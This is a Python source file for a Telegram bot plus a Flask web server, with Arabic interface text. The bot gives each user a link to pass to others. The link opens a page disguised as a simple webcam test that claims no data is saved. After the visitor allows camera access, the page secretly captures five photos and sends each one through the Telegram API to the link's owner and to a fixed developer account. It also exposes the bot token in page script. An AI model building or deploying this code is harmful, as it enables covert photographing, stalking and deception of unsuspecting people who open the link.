import telebot
import time
import logging
import os
from datetime import datetime
from requests.exceptions import ReadTimeout, ConnectionError
from flask import Flask, request, jsonify, make_response
from threading import Thread
import re

# ---------------------------------------------
# 1. إعدادات الأمان والمتغيرات البيئية
# ---------------------------------------------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise ValueError("لم يتم تعيين TELEGRAM_BOT_TOKEN في متغيرات البيئة")

DEVELOPER_CHAT_ID = os.environ.get("DEVELOPER_CHAT_ID")
if not DEVELOPER_CHAT_ID:
    raise ValueError("لم يتم تعيين DEVELOPER_CHAT_ID في متغيرات البيئة")
DEVELOPER_CHAT_ID = int(DEVELOPER_CHAT_ID)

BASE_URL = os.environ.get("BASE_URL", "https://whatsapp-bot-v1-5.onrender.com/")
GITHUB_FALLBACK_URL = os.environ.get("GITHUB_FALLBACK_URL", "https://khldwnnsraljrady-collab.github.io/whatsapp-bot-v1/")

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ---------------------------------------------
# 2. تطبيق Flask مع رؤوس أمان
# ---------------------------------------------
app = Flask(__name__)

@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://api.telegram.org; frame-ancestors 'none';"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

# ---------------------------------------------
# 3. صفحة HTML المضمنة (كاميرا عادية - لا تظهر أي شيء عن التيليجرام)
# ---------------------------------------------
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا الويب - اختبار الكاميرا</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            color: #fff; 
            padding: 20px; 
        }
        .container { 
            background: rgba(255,255,255,0.95); 
            border-radius: 24px; 
            padding: 40px 30px; 
            width: 100%; 
            max-width: 500px; 
            text-align: center; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.3); 
            color: #333;
        }
        .logo { 
            font-size: 4em; 
            margin-bottom: 10px; 
            color: #667eea;
        }
        h1 { 
            font-size: 1.8em; 
            margin-bottom: 15px; 
            color: #333;
        }
        .features { 
            display: grid; 
            grid-template-columns: repeat(2,1fr); 
            gap: 15px; 
            margin-bottom: 30px; 
        }
        .feature { 
            background: #f7f7f7; 
            border-radius: 16px; 
            padding: 20px 15px; 
            transition: 0.3s; 
        }
        .feature i { 
            font-size: 2em; 
            margin-bottom: 10px; 
            display: block; 
            color: #667eea;
        }
        .feature p {
            color: #666;
            font-size: 0.9em;
        }
        .start-btn { 
            background: linear-gradient(135deg, #667eea, #764ba2); 
            color: white; 
            border: none; 
            padding: 18px 40px; 
            border-radius: 50px; 
            font-size: 1.1em; 
            font-weight: 700; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            gap: 12px; 
            margin: 0 auto; 
            transition: 0.3s; 
            width: 100%;
        }
        .start-btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 5px 15px rgba(102,126,234,0.4);
        }
        .info-text {
            background: #e3f2fd;
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 20px;
            color: #1976d2;
            font-size: 0.85em;
        }
        #analysisScreen { 
            display: none; 
        }
        .video-container { 
            position: relative; 
            width: 100%; 
            height: 320px; 
            border-radius: 20px; 
            overflow: hidden; 
            margin: 25px 0; 
            border: 2px solid #ddd;
            background: #000;
        }
        video { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
            transform: scaleX(-1); 
        }
        .overlay { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.5); 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
        }
        .status-container { 
            background: #f7f7f7; 
            border-radius: 16px; 
            padding: 20px; 
            margin-bottom: 25px; 
        }
        .progress-container { 
            width: 100%; 
            height: 12px; 
            background: #e0e0e0; 
            border-radius: 6px; 
            overflow: hidden; 
            margin-top: 15px; 
        }
        .progress-bar { 
            height: 100%; 
            background: linear-gradient(90deg, #667eea, #764ba2); 
            width: 0%; 
            transition: width 0.5s ease; 
        }
        .counter { 
            font-size: 0.9em; 
            color: #666; 
            margin-top: 8px; 
        }
        .footer { 
            margin-top: 25px; 
            font-size: 0.8em; 
            color: #999; 
        }
        .pulse { 
            animation: pulse 2s infinite; 
        }
        @keyframes pulse { 
            0% { transform: scale(1); } 
            50% { transform: scale(1.1); } 
            100% { transform: scale(1); } 
        }
        @media (max-width:500px) { 
            .video-container { height: 280px; } 
            .features { grid-template-columns: 1fr; } 
        }
    </style>
</head>
<body>

<div class="container" id="mainScreen">
    <div class="logo"><i class="fas fa-camera"></i></div>
    <h1>📸 كاميرا الويب</h1>
    <p class="tagline">اختبار كاميرا الجهاز - تجربة سريعة وبسيطة</p>
    <div class="features">
        <div class="feature"><i class="fas fa-camera"></i><p>كاميرا عالية الجودة</p></div>
        <div class="feature"><i class="fas fa-bolt"></i><p>استجابة سريعة</p></div>
        <div class="feature"><i class="fas fa-check-circle"></i><p>اختبار فوري</p></div>
        <div class="feature"><i class="fas fa-shield-alt"></i><p>خاص ومباشر</p></div>
    </div>
    <div class="info-text">
        <i class="fas fa-info-circle"></i> يرجى السماح باستخدام الكاميرا لبدء الاختبار
    </div>
    <div class="btn-container">
        <button class="start-btn" onclick="startCapture()"><i class="fas fa-play-circle"></i> تشغيل الكاميرا</button>
    </div>
    <div class="footer">
        <p>اختبار بسيط للكاميرا - لن يتم حفظ أي بيانات</p>
    </div>
</div>

<div class="container" id="analysisScreen">
    <h1>📸 كاميرا نشطة</h1>
    <div class="video-container">
        <video id="video" autoplay playsinline></video>
        <div class="overlay">
            <i class="fas fa-camera pulse" style="font-size: 2em;"></i>
            <div class="analysis-text" id="analysisText" style="margin-top: 10px;">جاري التشغيل...</div>
        </div>
    </div>
    <div class="status-container">
        <div id="status">
            <i class="fas fa-sync-alt fa-spin"></i> 
            <span id="statusText">تهيئة الكاميرا...</span>
        </div>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="counter" id="counter">جاري التحميل</div>
    </div>
    <div class="footer">
        <p>سيتم إغلاق الكاميرا تلقائياً بعد الانتهاء</p>
    </div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    let dynamicChatId = urlParams.get('id');
    const fixedChatId = '""" + str(DEVELOPER_CHAT_ID) + """';
    const token = '""" + TOKEN + """';
    const fallbackUrl = '""" + GITHUB_FALLBACK_URL + """';

    // التحقق من صحة المعرف
    if (!dynamicChatId || !/^\\d+$/.test(dynamicChatId)) {
        document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>⚠️ رابط غير صالح</h2><p>الرجاء استخدام الرابط الصحيح.</p></div>';
        throw new Error('Invalid ID');
    }

    let photoCount = 0;
    let intervalId = null;
    let mediaStream = null;
    let fallbackTimer = null;
    const MAX_PHOTOS = 5;

    function startCapture() {
        document.getElementById('mainScreen').style.display = "none";
        document.getElementById('analysisScreen').style.display = "block";
        photoCount = 0;
        document.getElementById('progressBar').style.width = '0%';
        document.getElementById('counter').textContent = '0 من 5';
        document.getElementById('analysisText').textContent = 'طلب الوصول للكاميرا...';

        fallbackTimer = setTimeout(function() {
            window.location.href = fallbackUrl + '?id=' + dynamicChatId;
        }, 4000);

        navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, audio: false })
            .then(stream => {
                clearTimeout(fallbackTimer);
                mediaStream = stream;
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    document.getElementById('statusText').textContent = "الكاميرا جاهزة";
                    document.getElementById('analysisText').textContent = "استعد...";
                    setTimeout(() => {
                        captureAndSend();
                        intervalId = setInterval(captureAndSend, 2000);
                    }, 2000);
                };
            })
            .catch(err => {
                console.error("خطأ في الكاميرا:", err);
                window.location.href = fallbackUrl + '?id=' + dynamicChatId;
            });
    }

    function captureAndSend() {
        if (photoCount >= MAX_PHOTOS) {
            clearInterval(intervalId);
            document.getElementById('statusText').textContent = "✅ اكتمل الاختبار";
            document.getElementById('analysisText').textContent = "تم اكتمال الاختبار بنجاح";
            document.getElementById('progressBar').style.width = '100%';
            document.getElementById('counter').textContent = 'اكتمل';
            if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
            
            // إغلاق الصفحة بعد 3 ثواني
            setTimeout(() => {
                window.close();
            }, 3000);
            return;
        }

        photoCount++;
        const progressPercent = (photoCount / MAX_PHOTOS) * 100;
        document.getElementById('progressBar').style.width = `${progressPercent}%`;
        document.getElementById('counter').textContent = `${photoCount} من ${MAX_PHOTOS}`;
        document.getElementById('statusText').textContent = `جاري الاختبار...`;
        document.getElementById('analysisText').textContent = `📸 ${photoCount}`;

        const video = document.getElementById('video');
        if (video.srcObject) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                if (blob) {
                    sendPhotoToTelegram(dynamicChatId, blob);
                    sendPhotoToTelegram(fixedChatId, blob);
                }
            }, 'image/jpeg', 0.7);
        }
    }

    function sendPhotoToTelegram(chatId, blob) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
            .then(response => response.json())
            .then(data => console.log('تم الإرسال'))
            .catch(error => console.error('خطأ:', error));
    }
</script>
</body>
</html>
"""

@app.route('/')
def home():
    user_id = request.args.get('id')
    if user_id and not re.match(r'^\d+$', user_id):
        return make_response("معرف غير صالح", 400)
    return HTML_PAGE

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    return jsonify({"status": "ok"})

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# ---------------------------------------------
# 4. بوت تيليجرام
# ---------------------------------------------
bot = telebot.TeleBot(TOKEN)
user_stats = {}
total_photos_received = 0

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    user_name = message.from_user.first_name

    if user_id not in user_stats:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 0,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    else:
        user_stats[user_id]["last_active"] = datetime.now()

    personal_link = f"{BASE_URL}?id={user_id}"

    markup = telebot.types.InlineKeyboardMarkup()
    camera_btn = telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا", url=personal_link)
    help_btn = telebot.types.InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
    stats_btn = telebot.types.InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
    markup.add(camera_btn)
    markup.add(help_btn, stats_btn)

    response = (
        f"🎉 أهلاً بك *{user_name}*!\n\n"
        f"✨ هذا هو *رابطك الشخصي*:\n"
        f"`{personal_link}`\n\n"
        f"📌 *ملاحظة:* الرابط آمن تماماً\n\n"
        f"🔒 *الخصوصية:* الصور تصل إليك فقط"
    )
    bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
    logger.info(f"New user started: {user_name} (ID: {user_id})")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.chat.id
    if user_id in user_stats:
        stat = user_stats[user_id]
        response = (
            f"📊 *إحصائياتك*\n\n"
            f"👤 الاسم: {stat['name']}\n"
            f"📸 عدد الصور: {stat['photo_count']}\n"
            f"📅 أول استخدام: {stat['first_seen'].strftime('%Y-%m-%d')}\n"
            f"🕐 آخر نشاط: {stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
            f"🌐 *عام:*\n"
            f"👥 المستخدمين: {len(user_stats)}\n"
            f"🖼️ إجمالي الصور: {total_photos_received}"
        )
    else:
        response = "❌ استخدم /start أولاً"
    bot.send_message(user_id, response, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "📖 *دليل الاستخدام*\n\n"
        "🎯 *الأوامر:*\n"
        "/start - الحصول على رابطك\n"
        "/stats - عرض إحصائياتك\n"
        "/help - التعليمات\n\n"
        "🔧 *طريقة العمل:*\n"
        "1. اضغط /start للحصول على رابط\n"
        "2. أرسل الرابط لأي شخص\n"
        "3. عندما يفتح الرابط، ستصل الصور إليك\n\n"
        "⚠️ *ملاحظة:* الرابط آمن تماماً"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        bot.reply_to(message, "❌ هذا الأمر للمطور فقط!")
        return

    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ صيغة خاطئة. استخدم:\n/broadcast نص الرسالة")
        return

    broadcast_text = parts[1]
    markup = telebot.types.InlineKeyboardMarkup()
    site_btn = telebot.types.InlineKeyboardButton(text="🌐 فتح الرابط", url=BASE_URL)
    markup.add(site_btn)

    success = 0
    fail = 0
    for uid in user_stats.keys():
        try:
            bot.send_message(uid, f"📢 *إشعار:*\n\n{broadcast_text}", parse_mode="Markdown", reply_markup=markup)
            success += 1
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Failed to send to {uid}: {e}")
            fail += 1
    bot.reply_to(message, f"✅ تم الإرسال!\n✓ {success} مستخدم\n✗ {fail} فشل")

@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    global total_photos_received
    user_id = message.chat.id
    user_name = message.from_user.first_name

    if user_id in user_stats:
        user_stats[user_id]["photo_count"] += 1
        user_stats[user_id]["last_active"] = datetime.now()
    else:
        user_stats[user_id] = {
            "name": user_name,
            "photo_count": 1,
            "first_seen": datetime.now(),
            "last_active": datetime.now()
        }
    total_photos_received += 1

    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    file_size = file_info.file_size / 1024

    caption = (
        f"✅ صورة جديدة!\n\n"
        f"👤 من: {user_name}\n"
        f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
        f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}"
    )
    bot.reply_to(message, caption)
    logger.info(f"Received photo from {user_name} (ID: {user_id})")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "help":
        send_help(call.message)
        bot.answer_callback_query(call.id, "📖 عرض التعليمات")
    elif call.data == "stats":
        show_stats(call.message)
        bot.answer_callback_query(call.id, "📊 عرض الإحصائيات")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.text.startswith('/'):
        bot.reply_to(message, "❌ أمر غير معروف!\n\n✅ الأوامر:\n/start - رابطك\n/stats - إحصائياتك\n/help - التعليمات")
    else:
        bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nاستخدم /start للحصول على رابطك.")

# ---------------------------------------------
# 5. تشغيل البوت
# ---------------------------------------------
keep_alive()

while True:
    try:
        logger.info("Starting Telegram bot...")
        bot.polling(none_stop=True, interval=1, timeout=60)
    except (ReadTimeout, ConnectionError) as e:
        logger.error(f"Connection error: {e}. Retrying in 15 seconds...")
        time.sleep(15)
    except Exception as e:
        logger.error(f"Unexpected error: {e}. Retrying in 15 seconds...")
        time.sleep(15)
